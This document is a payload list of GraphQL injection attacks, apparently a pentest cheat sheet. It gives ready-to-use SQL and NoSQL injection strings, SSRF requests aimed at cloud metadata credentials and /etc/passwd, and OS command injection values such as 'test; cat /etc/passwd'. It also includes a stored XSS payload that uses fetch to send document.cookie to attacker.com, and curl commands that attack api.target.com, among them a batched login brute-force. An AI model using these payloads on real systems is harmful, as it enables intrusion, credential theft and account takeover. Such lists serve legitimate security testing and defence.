# GraphQL Injection Payloads
# SQLi, NoSQLi, SSRF, and OS Command Injection via GraphQL Variables
# Severity: HIGH to CRITICAL

# ============================================================
# 1. SQL INJECTION VIA GRAPHQL ARGUMENTS
# ============================================================

# String arguments
{"query": "{ user(name: \"' OR '1'='1\") { id email } }"}
{"query": "{ user(name: \"' OR 1=1--\") { id email } }"}
{"query": "{ user(name: \"' UNION SELECT 1,email,password FROM users--\") { id email } }"}
{"query": "{ user(name: \"admin'--\") { id email } }"}
{"query": "{ users(search: \"' OR ''='\") { id email } }"}

# Via variables (preferred — cleaner)
{"query": "query getUser($name: String!) { user(name: $name) { id email } }",
 "variables": {"name": "' OR '1'='1"}}

{"query": "query getUser($name: String!) { user(name: $name) { id email } }",
 "variables": {"name": "' UNION SELECT null,email,password FROM users--"}}

{"query": "query getUser($id: ID!) { user(id: $id) { id email } }",
 "variables": {"id": "1 OR 1=1"}}

# Order by injection
{"query": "query getUsers($orderBy: String!) { users(orderBy: $orderBy) { id email } }",
 "variables": {"orderBy": "id; DROP TABLE users--"}}

{"query": "query getUsers($sort: String!) { users(sort: $sort) { id email } }",
 "variables": {"sort": "name ASC, (SELECT password FROM users LIMIT 1)"}}

# Filter injection
{"query": "{ products(filter: { category: \"electronics' OR '1'='1\" }) { id name price } }"}

# ============================================================
# 2. NoSQL INJECTION VIA GRAPHQL
# ============================================================

# MongoDB operator injection via variables
{"query": "query login($email: String!, $password: String!) { login(email: $email, password: $password) { token } }",
 "variables": {"email": {"$gt": ""}, "password": {"$gt": ""}}}

{"query": "query getUser($id: String!) { user(id: $id) { id email } }",
 "variables": {"id": {"$ne": null}}}

{"query": "query search($filter: String!) { users(filter: $filter) { id email } }",
 "variables": {"filter": {"$regex": ".*"}}}

# JSON-based NoSQL injection in string args
{"query": "{ user(email: \"{\\\"$gt\\\":\\\"\\\"}\") { id email } }"}
{"query": "{ users(filter: \"{\\\"$where\\\":\\\"this.password.match(/.*/)\\\"}\") { id email } }"}

# ============================================================
# 3. SSRF VIA GRAPHQL
# ============================================================

# Import/fetch URL arguments
{"query": "mutation { importData(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\") { result } }"}
{"query": "mutation { importData(url: \"http://127.0.0.1:8080/admin\") { result } }"}
{"query": "mutation { importData(url: \"file:///etc/passwd\") { result } }"}

# Webhook endpoints
{"query": "mutation { createWebhook(url: \"http://169.254.169.254/latest/meta-data/\") { id } }"}
{"query": "mutation { createWebhook(url: \"http://internal-service.local:8080/\") { id } }"}

# Profile/avatar URL
{"query": "mutation { updateProfile(avatarUrl: \"http://169.254.169.254/latest/meta-data/\") { id avatar } }"}
{"query": "mutation { updateProfile(website: \"http://127.0.0.1:6379/\") { id } }"}

# PDF generation
{"query": "mutation { generateReport(templateUrl: \"http://169.254.169.254/latest/user-data\") { downloadUrl } }"}

# ============================================================
# 4. OS COMMAND INJECTION VIA GRAPHQL
# ============================================================

# Filename/path arguments
{"query": "mutation { processFile(filename: \"test; id\") { result } }"}
{"query": "mutation { processFile(filename: \"test | whoami\") { result } }"}
{"query": "mutation { processFile(filename: \"test`id`\") { result } }"}
{"query": "mutation { processFile(filename: \"test$(id)\") { result } }"}

# Via variables
{"query": "mutation process($file: String!) { processFile(filename: $file) { result } }",
 "variables": {"file": "test; cat /etc/passwd"}}

{"query": "mutation convert($input: String!) { convertFile(path: $input) { url } }",
 "variables": {"input": "test.pdf & whoami"}}

# ============================================================
# 5. XSS VIA GRAPHQL (Stored)
# ============================================================

# Create content with XSS payloads
{"query": "mutation { createPost(title: \"<script>alert(document.cookie)</script>\", body: \"test\") { id } }"}
{"query": "mutation { updateProfile(name: \"<img src=x onerror=alert(1)>\") { id } }"}
{"query": "mutation { createComment(body: \"<svg onload=alert(document.domain)>\") { id } }"}
{"query": "mutation { updateProfile(bio: \"<a href=javascript:alert(1)>click</a>\") { id } }"}

# Via variables
{"query": "mutation create($name: String!) { createItem(name: $name) { id } }",
 "variables": {"name": "<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>"}}

# ============================================================
# 6. DIRECTIVE OVERLOADING
# ============================================================

# Overload @skip/@include directives
{"query": "{ users @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false) { id email } }"}

# Custom directive injection
{"query": "{ users @deprecated(reason: \"test\") { id } }"}

# ============================================================
# 7. SUBSCRIPTION ABUSE
# ============================================================

# Subscribe to events you shouldn't access
{"query": "subscription { onUserCreated { id email password } }"}
{"query": "subscription { onPaymentProcessed { userId amount cardLast4 } }"}
{"query": "subscription { onMessageSent { sender recipient content } }"}

# ============================================================
# 8. CURL EXAMPLES
# ============================================================

# SQLi via curl
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"query":"query($n:String!){user(name:$n){id email}}","variables":{"name":"'\'' OR '\''1'\''='\''1"}}'

# SSRF via curl
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"query":"mutation($u:String!){importData(url:$u){result}}","variables":{"url":"http://169.254.169.254/latest/meta-data/"}}'

# Batch brute-force via curl
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '[{"query":"mutation{login(email:\"admin@target.com\",password:\"pass1\"){token}}"},{"query":"mutation{login(email:\"admin@target.com\",password:\"pass2\"){token}}"},{"query":"mutation{login(email:\"admin@target.com\",password:\"pass3\"){token}}"}]'
